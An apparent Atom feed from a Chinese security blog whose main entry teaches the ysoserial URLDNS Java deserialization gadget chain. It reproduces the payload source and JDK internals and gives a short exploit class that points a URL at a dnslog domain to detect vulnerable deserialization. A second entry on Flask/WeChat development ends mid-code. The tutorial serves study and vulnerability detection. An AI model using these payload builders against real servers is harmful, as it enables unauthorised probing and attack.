<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>xianyu123&#39;s Blog</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://0clickjacking0.github.io/"/>
  <updated>2021-03-03T09:00:28.823Z</updated>
  <id>http://0clickjacking0.github.io/</id>
  
  <author>
    <name>xianyu123</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>从ysoserial中学习URLDNS利用链</title>
    <link href="http://0clickjacking0.github.io/2021/02/24/%E4%BB%8Eysoserial%E4%B8%AD%E5%AD%A6%E4%B9%A0URLDNS%E5%88%A9%E7%94%A8%E9%93%BE/"/>
    <id>http://0clickjacking0.github.io/2021/02/24/从ysoserial中学习URLDNS利用链/</id>
    <published>2021-02-24T08:09:26.000Z</published>
    <updated>2021-03-03T09:00:28.823Z</updated>
    
    <content type="html"><![CDATA[<p>从ysoserial中学习URLDNS利用链</p><a id="more"></a><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>最近在学习java反序列化的内容，一开始从网上学习<code>CommonsCollections</code>的利用链，发现挺难（是我太菜了，23333），然后就来学习一下ysoserial中最简单的例子——URLDNS</p><h1 id="ysoserial"><a href="#ysoserial" class="headerlink" title="ysoserial"></a>ysoserial</h1><p>在正式开始分析之前，先介绍一下这个工具。github地址：<code>https://github.com/frohoff/ysoserial</code>。下面就引用一段p牛的话来说明这个工具的用途。</p><blockquote><p>反序列化漏洞在各个语⾔⾥本不是⼀个新鲜的名词，但2015年Gabriel Lawrence (@gebl)和Chris Frohoﬀ (@frohoﬀ)在AppSecCali上提出了利⽤Apache Commons Collections来构造命令执⾏的利⽤ 链，并在年底因为对Weblogic、JBoss、Jenkins等著名应⽤的利⽤，⼀⽯激起千层浪，彻底打开了⼀⽚ Java安全的蓝海。</p><p>⽽ysoserial就是两位原作者在此议题中释出的⼀个⼯具，它可以让⽤户根据⾃⼰选择的利⽤链，⽣成反 序列化利⽤数据，通过将这些数据发送给⽬标，从⽽执⾏⽤户预先定义的命令。</p></blockquote><p>ysoserial的使⽤也很简单，这里就不过多赘述了，可以去github项目查看。</p><h2 id="关于gadget"><a href="#关于gadget" class="headerlink" title="关于gadget"></a>关于gadget</h2><p>利⽤链也叫<code>gadget chains</code>，我们通常称为<code>gadget</code>。我理解的<code>gadget</code>就相当于一条链子，从起点（入口）到终点（可能是命令执行结束的位置）的一条路径。</p><h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p><code>URLDNS</code>是<code>ysoserial</code>中⼀个利⽤链的名字。这个利用链比较特殊，因为其参数不是⼀个可以“利⽤”的命令，⽽是⼀个URL，其能触发的结果也不是命令执⾏，⽽是⼀次DNS请求。</p><p>虽然这个利用链不能执行命令，但是⾮常适合我们在检测反序列化漏洞时使⽤：</p><ul><li>使⽤Java内置的类构造，没有依赖第三⽅库</li><li>在⽬标没有回显的时候，能够通过dnslog来判断是否存在反序列化漏洞</li></ul><p>接下来我们来看代码。<code>ysoserial/payloads/URLDNS.java</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> ysoserial.payloads;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.net.InetAddress;</span><br><span class="line"><span class="keyword">import</span> java.net.URLConnection;</span><br><span class="line"><span class="keyword">import</span> java.net.URLStreamHandler;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> ysoserial.payloads.annotation.Authors;</span><br><span class="line"><span class="keyword">import</span> ysoserial.payloads.annotation.Dependencies;</span><br><span class="line"><span class="keyword">import</span> ysoserial.payloads.annotation.PayloadTest;</span><br><span class="line"><span class="keyword">import</span> ysoserial.payloads.util.PayloadRunner;</span><br><span class="line"><span class="keyword">import</span> ysoserial.payloads.util.Reflections;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * A blog post with more details about this gadget chain is at the url below:</span></span><br><span class="line"><span class="comment"> *   https://blog.paranoidsoftware.com/triggering-a-dns-lookup-using-java-deserialization/</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *   This was inspired by  Philippe Arteau <span class="doctag">@h</span>3xstream, who wrote a blog</span></span><br><span class="line"><span class="comment"> *   posting describing how he modified the Java Commons Collections gadget</span></span><br><span class="line"><span class="comment"> *   in ysoserial to open a URL. This takes the same idea, but eliminates</span></span><br><span class="line"><span class="comment"> *   the dependency on Commons Collections and does a DNS lookup with just</span></span><br><span class="line"><span class="comment"> *   standard JDK classes.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *   The Java URL class has an interesting property on its equals and</span></span><br><span class="line"><span class="comment"> *   hashCode methods. The URL class will, as a side effect, do a DNS lookup</span></span><br><span class="line"><span class="comment"> *   during a comparison (either equals or hashCode).</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *   As part of deserialization, HashMap calls hashCode on each key that it</span></span><br><span class="line"><span class="comment"> *   deserializes, so using a Java URL object as a serialized key allows</span></span><br><span class="line"><span class="comment"> *   it to trigger a DNS lookup.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *   Gadget Chain:</span></span><br><span class="line"><span class="comment"> *     HashMap.readObject()</span></span><br><span class="line"><span class="comment"> *       HashMap.putVal()</span></span><br><span class="line"><span class="comment"> *         HashMap.hash()</span></span><br><span class="line"><span class="comment"> *           URL.hashCode()</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@SuppressWarnings</span>(&#123; <span class="string">"rawtypes"</span>, <span class="string">"unchecked"</span> &#125;)</span><br><span class="line"><span class="meta">@PayloadTest</span>(skip = <span class="string">"true"</span>)</span><br><span class="line"><span class="meta">@Dependencies</span>()</span><br><span class="line"><span class="meta">@Authors</span>(&#123; Authors.GEBL &#125;)</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">URLDNS</span> <span class="keyword">implements</span> <span class="title">ObjectPayload</span>&lt;<span class="title">Object</span>&gt; </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> Object <span class="title">getObject</span><span class="params">(<span class="keyword">final</span> String url)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"></span><br><span class="line">                <span class="comment">//Avoid DNS resolution during payload creation</span></span><br><span class="line">                <span class="comment">//Since the field &lt;code&gt;java.net.URL.handler&lt;/code&gt; is transient, it will not be part of the serialized payload.</span></span><br><span class="line">                URLStreamHandler handler = <span class="keyword">new</span> SilentURLStreamHandler();</span><br><span class="line"></span><br><span class="line">                HashMap ht = <span class="keyword">new</span> HashMap(); <span class="comment">// HashMap that will contain the URL</span></span><br><span class="line">                URL u = <span class="keyword">new</span> URL(<span class="keyword">null</span>, url, handler); <span class="comment">// URL to use as the Key</span></span><br><span class="line">                ht.put(u, url); <span class="comment">//The value can be anything that is Serializable, URL as the key is what triggers the DNS lookup.</span></span><br><span class="line"></span><br><span class="line">                Reflections.setFieldValue(u, <span class="string">"hashCode"</span>, -<span class="number">1</span>); <span class="comment">// During the put above, the URL's hashCode is calculated and cached. This resets that so the next time hashCode is called a DNS lookup will be triggered.</span></span><br><span class="line"></span><br><span class="line">                <span class="keyword">return</span> ht;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(<span class="keyword">final</span> String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">                PayloadRunner.run(URLDNS.class, args);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * &lt;p&gt;This instance of URLStreamHandler is used to avoid any DNS resolution while creating the URL instance.</span></span><br><span class="line"><span class="comment">         * DNS resolution is used for vulnerability detection. It is important not to probe the given URL prior</span></span><br><span class="line"><span class="comment">         * using the serialized object.&lt;/p&gt;</span></span><br><span class="line"><span class="comment">         *</span></span><br><span class="line"><span class="comment">         * &lt;b&gt;Potential false negative:&lt;/b&gt;</span></span><br><span class="line"><span class="comment">         * &lt;p&gt;If the DNS name is resolved first from the tester computer, the targeted server might get a cache hit on the</span></span><br><span class="line"><span class="comment">         * second resolution.&lt;/p&gt;</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">SilentURLStreamHandler</span> <span class="keyword">extends</span> <span class="title">URLStreamHandler</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">                <span class="function"><span class="keyword">protected</span> URLConnection <span class="title">openConnection</span><span class="params">(URL u)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">                        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="function"><span class="keyword">protected</span> <span class="keyword">synchronized</span> InetAddress <span class="title">getHostAddress</span><span class="params">(URL u)</span> </span>&#123;</span><br><span class="line">                        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>从上述代码中的注释中，我们可以了解到，这个反序列化漏洞跟<code>HashMap</code>类有关。触发反序列化的⽅法是<code>readObject</code>，所以我们可以直接进入到<code>HashMap</code>类的<code>readObject</code>⽅法，然后我们在第41行打断点，进入<code>hash</code>方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(java.io.ObjectInputStream s)</span></span></span><br><span class="line"><span class="function">        <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">        <span class="comment">// Read in the threshold (ignored), loadfactor, and any hidden stuff</span></span><br><span class="line">        s.defaultReadObject();</span><br><span class="line">        reinitialize();</span><br><span class="line">        <span class="keyword">if</span> (loadFactor &lt;= <span class="number">0</span> || Float.isNaN(loadFactor))</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> InvalidObjectException(<span class="string">"Illegal load factor: "</span> +</span><br><span class="line">                                             loadFactor);</span><br><span class="line">        s.readInt();                <span class="comment">// Read and ignore number of buckets</span></span><br><span class="line">        <span class="keyword">int</span> mappings = s.readInt(); <span class="comment">// Read number of mappings (size)</span></span><br><span class="line">        <span class="keyword">if</span> (mappings &lt; <span class="number">0</span>)</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> InvalidObjectException(<span class="string">"Illegal mappings count: "</span> +</span><br><span class="line">                                             mappings);</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (mappings &gt; <span class="number">0</span>) &#123; <span class="comment">// (if zero, use defaults)</span></span><br><span class="line">            <span class="comment">// Size the table using given load factor only if within</span></span><br><span class="line">            <span class="comment">// range of 0.25...4.0</span></span><br><span class="line">            <span class="keyword">float</span> lf = Math.min(Math.max(<span class="number">0.25f</span>, loadFactor), <span class="number">4.0f</span>);</span><br><span class="line">            <span class="keyword">float</span> fc = (<span class="keyword">float</span>)mappings / lf + <span class="number">1.0f</span>;</span><br><span class="line">            <span class="keyword">int</span> cap = ((fc &lt; DEFAULT_INITIAL_CAPACITY) ?</span><br><span class="line">                       DEFAULT_INITIAL_CAPACITY :</span><br><span class="line">                       (fc &gt;= MAXIMUM_CAPACITY) ?</span><br><span class="line">                       MAXIMUM_CAPACITY :</span><br><span class="line">                       tableSizeFor((<span class="keyword">int</span>)fc));</span><br><span class="line">            <span class="keyword">float</span> ft = (<span class="keyword">float</span>)cap * lf;</span><br><span class="line">            threshold = ((cap &lt; MAXIMUM_CAPACITY &amp;&amp; ft &lt; MAXIMUM_CAPACITY) ?</span><br><span class="line">                         (<span class="keyword">int</span>)ft : Integer.MAX_VALUE);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// Check Map.Entry[].class since it's the nearest public type to</span></span><br><span class="line">            <span class="comment">// what we're actually creating.</span></span><br><span class="line">            SharedSecrets.getJavaOISAccess().checkArray(s, Map.Entry[].class, cap);</span><br><span class="line">            <span class="meta">@SuppressWarnings</span>(&#123;<span class="string">"rawtypes"</span>,<span class="string">"unchecked"</span>&#125;)</span><br><span class="line">            Node&lt;K,V&gt;[] tab = (Node&lt;K,V&gt;[])<span class="keyword">new</span> Node[cap];</span><br><span class="line">            table = tab;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// Read the keys and values, and put the mappings in the HashMap</span></span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; mappings; i++) &#123;</span><br><span class="line">                <span class="meta">@SuppressWarnings</span>(<span class="string">"unchecked"</span>)</span><br><span class="line">                    K key = (K) s.readObject();</span><br><span class="line">                <span class="meta">@SuppressWarnings</span>(<span class="string">"unchecked"</span>)</span><br><span class="line">                    V value = (V) s.readObject();</span><br><span class="line">                putVal(hash(key), key, value, <span class="keyword">false</span>, <span class="keyword">false</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><code>hash</code>方法这里判断了key是否为空，不为空就调用了key的<code>hashCode</code>方法并计算出值，key是一个<code>java.net.URL</code>对象（key的值实际上就是域名），然后我们进入到<code>hashCode</code>方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> <span class="title">hash</span><span class="params">(Object key)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> h;</span><br><span class="line">        <span class="keyword">return</span> (key == <span class="keyword">null</span>) ? <span class="number">0</span> : (h = key.hashCode()) ^ (h &gt;&gt;&gt; <span class="number">16</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>这里判断<code>hashCode</code>的值是否为-1，如果不等于-1，就返回<code>hashCode</code>；反之，调用<code>handler</code>（<code>URLStreamHandler</code>对象）的<code>hashCode</code>方法，继续跟进其<code>hashCode</code>⽅法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="keyword">int</span> <span class="title">hashCode</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (hashCode != -<span class="number">1</span>)</span><br><span class="line">            <span class="keyword">return</span> hashCode;</span><br><span class="line"></span><br><span class="line">        hashCode = handler.hashCode(<span class="keyword">this</span>);</span><br><span class="line">        <span class="keyword">return</span> hashCode;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><code>URLStreamHandler</code>对象的<code>hashCode</code>⽅法如下，跟进<code>getHostAddress</code>方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">int</span> <span class="title">hashCode</span><span class="params">(URL u)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> h = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Generate the protocol part.</span></span><br><span class="line">        String protocol = u.getProtocol();</span><br><span class="line">        <span class="keyword">if</span> (protocol != <span class="keyword">null</span>)</span><br><span class="line">            h += protocol.hashCode();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Generate the host part.</span></span><br><span class="line">        InetAddress addr = getHostAddress(u);</span><br><span class="line">        <span class="keyword">if</span> (addr != <span class="keyword">null</span>) &#123;</span><br><span class="line">            h += addr.hashCode();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            String host = u.getHost();</span><br><span class="line">            <span class="keyword">if</span> (host != <span class="keyword">null</span>)</span><br><span class="line">                h += host.toLowerCase().hashCode();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Generate the file part.</span></span><br><span class="line">        String file = u.getFile();</span><br><span class="line">        <span class="keyword">if</span> (file != <span class="keyword">null</span>)</span><br><span class="line">            h += file.hashCode();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Generate the port part.</span></span><br><span class="line">        <span class="keyword">if</span> (u.getPort() == -<span class="number">1</span>)</span><br><span class="line">            h += getDefaultPort();</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            h += u.getPort();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Generate the ref part.</span></span><br><span class="line">        String ref = u.getRef();</span><br><span class="line">        <span class="keyword">if</span> (ref != <span class="keyword">null</span>)</span><br><span class="line">            h += ref.hashCode();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> h;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><img src="http://images.xianyu123.club/20210303160820.png" alt="image-20210303160820256"></p><p><code>getHostAddress</code>方法如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">synchronized</span> InetAddress <span class="title">getHostAddress</span><span class="params">(URL u)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (u.hostAddress != <span class="keyword">null</span>)</span><br><span class="line">            <span class="keyword">return</span> u.hostAddress;</span><br><span class="line"></span><br><span class="line">        String host = u.getHost();</span><br><span class="line">        <span class="keyword">if</span> (host == <span class="keyword">null</span> || host.equals(<span class="string">""</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                u.hostAddress = InetAddress.getByName(host);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (UnknownHostException ex) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (SecurityException se) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> u.hostAddress;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>这里关注第10行的<code>InetAddress.getByName</code>方法，该方法的作⽤是根据主机名，获取其IP地址，在⽹络上其实就是⼀次 DNS查询。</p><p><img src="http://images.xianyu123.club/20210303160701.png" alt="image-20210303160701587"></p><p>所以整条gadget如下：</p><ol><li><code>HashMap-&gt;readObject()</code></li><li><code>HashMap-&gt;putVal()</code></li><li><code>HashMap-&gt;hash()</code></li><li><code>URL-&gt;hashCode()</code></li><li><code>URLStreamHandler-&gt;hashCode()</code></li><li><code>URLStreamHandler-&gt;getHostAddress()</code></li><li><code>InetAddress-&gt;getByName()</code></li></ol><p>要构造这个<code>gadget</code>，第1步需要先初始化⼀个<code>java.net.URL</code>对象，<code>java.net.URL</code>对象作为key<code>java.util.HashMap</code>中。第2步设置这个<code>java.net.URL</code>对象的<code>hashCode</code>为初始值<code>-1</code>（这个<code>hashCode</code>是私有类型，这里涉及到一些反射的知识，不过多赘述），这样反序列化时将会重新计算其<code>hashCode</code>，才能触发到后⾯的DNS请求，否则不会调⽤<code>URL-&gt;hashCode()</code>。</p><p>我们可以构造出exp如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> serialize;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">URLDNS</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException, NoSuchFieldException, IllegalAccessException </span>&#123;</span><br><span class="line">        HashMap&lt;URL, String&gt; obj = <span class="keyword">new</span> HashMap&lt;URL, String&gt;();</span><br><span class="line">        String dnslog = <span class="string">"http://t6nr49.dnslog.cn"</span>;</span><br><span class="line">        URL url = <span class="keyword">new</span> URL(dnslog);</span><br><span class="line">        Class clazz = Class.forName(<span class="string">"java.net.URL"</span>);</span><br><span class="line">        Field field = <span class="keyword">null</span>;</span><br><span class="line">        field = clazz.getDeclaredField(<span class="string">"hashCode"</span>);</span><br><span class="line">        field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        field.set(url,-<span class="number">1</span>);</span><br><span class="line">        obj.put(url,<span class="string">"123"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里我们借助<a href="http://www.dnslog.cn/" target="_blank" rel="noopener">DNSLOG</a>来验证此反序列化漏洞，可以看到成功解析（这里有一个小的tips，大家都知道DNS解析是会在本地留缓存的，所以如果想要重复验证此漏洞，每验证一次就更换一次域名）</p><p><img src="http://images.xianyu123.club/20210303164335.png" alt="image-20210303164335207"></p><p>至于payload中的最后这个类其实无关紧要的，只是<code>ysoserial</code>为了防⽌生成payload的时候也执⾏了URL请求和DNS查询。</p><p><img src="http://images.xianyu123.club/20210303162325.png" alt="image-20210303162325877"></p><h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><ol><li>Java安全漫谈 - 08.反序列化篇(2)</li></ol>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;从ysoserial中学习URLDNS利用链&lt;/p&gt;
    
    </summary>
    
      <category term="Web Security" scheme="http://0clickjacking0.github.io/categories/Web-Security/"/>
    
    
  </entry>
  
  <entry>
    <title>微信公众号开发遇到的一些坑</title>
    <link href="http://0clickjacking0.github.io/2021/02/15/%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7%E5%BC%80%E5%8F%91%E9%81%87%E5%88%B0%E7%9A%84%E4%B8%80%E4%BA%9B%E5%9D%91/"/>
    <id>http://0clickjacking0.github.io/2021/02/15/微信公众号开发遇到的一些坑/</id>
    <published>2021-02-15T15:45:17.000Z</published>
    <updated>2021-02-18T12:19:12.565Z</updated>
    
    <content type="html"><![CDATA[<p>微信公众号开发遇到的一些坑，这里记录一下</p><a id="more"></a><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>最近做了微信公众号的一些简单的开发，我是用flask+flask-Restful开发的，这里记录一下踩的坑。</p><h1 id="坑1——flask-Restful中文返回是unicode问题"><a href="#坑1——flask-Restful中文返回是unicode问题" class="headerlink" title="坑1——flask-Restful中文返回是unicode问题"></a>坑1——flask-Restful中文返回是unicode问题</h1><p>在代码中配置如下就好了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">app.config[<span class="string">'JSON_AS_ASCII'</span>] = <span class="keyword">False</span></span><br><span class="line">app.config.update(RESTFUL_JSON=dict(ensure_ascii=<span class="keyword">False</span>))</span><br></pre></td></tr></table></figure><h1 id="坑2——被动回复用户消息，回复文本消息中使用了-n换行符不解析"><a href="#坑2——被动回复用户消息，回复文本消息中使用了-n换行符不解析" class="headerlink" title="坑2——被动回复用户消息，回复文本消息中使用了\n换行符不解析"></a>坑2——被动回复用户消息，回复文本消息中使用了\n换行符不解析</h1><p>这里需要我们返回一个response对象，而不是普通的字符串。因为我是用<code>flask-restful</code>开发的，使用<code>make_response</code>就好了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># filename: reply.py</span></span><br><span class="line"></span><br><span 